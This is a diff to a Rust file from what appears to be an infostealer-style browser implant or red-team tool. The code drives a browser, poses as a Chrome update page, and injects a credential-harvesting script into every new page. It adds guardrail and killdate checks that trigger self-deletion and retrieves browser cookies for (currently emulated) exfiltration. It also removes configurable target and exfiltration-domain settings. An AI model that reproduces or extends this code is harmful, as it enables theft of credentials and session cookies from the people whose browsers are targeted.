@@ -32,16 +32,25 @@ pub async fn run_browser(junc_path: &PathBuf) -> Result<bool, Box<dyn std::error
 
     if cookies.is_empty() {
         // Open page for whats new (simulate update)
-        let _ = browser.new_page("https://developer.chrome.com/new").await?;
+        let page = browser.new_page("https://developer.chrome.com/new").await?;
+
+        #[cfg(feature = "debug")]
+        println!("[*] Checking guardrails...");
+        // If we fail the guardrails check
+        if !page.evaluate(include_str!("js/guardrails.js")).await?.into_value()? {
+            #[cfg(feature = "debug")]
+            println!("[-] Guardrails check failed");
+
+            browser.close().await?;
+            browser.wait().await?;
+
+            return Ok(true);
+        }
+
+        #[cfg(feature = "debug")]
+        println!("[+] Guardrails check passed");
     } else {
         let _ = browser.new_page("chrome://newtab").await?;
-    }
-
-    let target_url = env!("TARGET_URL");
-    let exfil_domain = env!("EXFIL_DOMAIN");
-    #[cfg(feature = "debug")] {
-        println!("[*] Using target url: {}", target_url);
-        println!("[*] Using exfil domain: {}", exfil_domain);
     }
 
     // Lookup table to keep track of pages already injected.
@@ -68,13 +77,13 @@ pub async fn run_browser(junc_path: &PathBuf) -> Result<bool, Box<dyn std::error
             // Check if we have already injected the script into this page.
             if !injected_pages.contains(&page_id) {
                 #[cfg(feature = "debug")]
-                println!("[*] New page detected");
+                println!("[+] New page detected");
 
                 #[cfg(feature = "debug")]
                 println!("[*] Injecting JS into page with ID: {:?}", page_id);
                 page.execute(
                     AddScriptToEvaluateOnNewDocumentParams::builder()
-                    .source(include_str!("js/credentials.js"))
+                    .source(include_str!("js/processed_credentials.js"))
                     .build()?,
                 )
                 .await?;
@@ -94,15 +103,31 @@ pub async fn run_browser(junc_path: &PathBuf) -> Result<bool, Box<dyn std::error
     #[cfg(feature = "debug")]
     println!("[*] Checking killdate...");
     let page = browser.new_page("about:blank").await?;
+    let delete_self: bool = page.evaluate(include_str!("js/processed_killdate.js")).await?.into_value()?;
 
-    let current_timestamp = page.evaluate("Math.floor(Date.now() / 1000)").await?.into_value::<u64>()?;
-    let killdate_timestamp: u64 = env!("KILLDATE_TIMESTAMP").parse()?;
+    if delete_self {
+        #[cfg(feature = "debug")]
+        println!("[-] Current date is past killdate.");
 
-    // Compare the timestamps
-    let is_past_killdate = current_timestamp > killdate_timestamp;
+        #[cfg(feature = "debug")]
+        println!("[*] Retrieving cookies...");
+        let _cookies = browser.get_cookies().await?;
+
+        #[cfg(feature = "debug")]
+        println!("[*] Sending cookies...");
+
+        // Emulate exfill
+        sleep(Duration::from_secs(1)).await;
+
+        #[cfg(feature = "debug")]
+        println!("[+] Done");
+    } else {
+        #[cfg(feature = "debug")]
+        println!("[+] Current date is not past killdate.");
+    }
 
     browser.close().await?;
     browser.wait().await?;
 
-    Ok(is_past_killdate)
+    Ok(delete_self)
 }
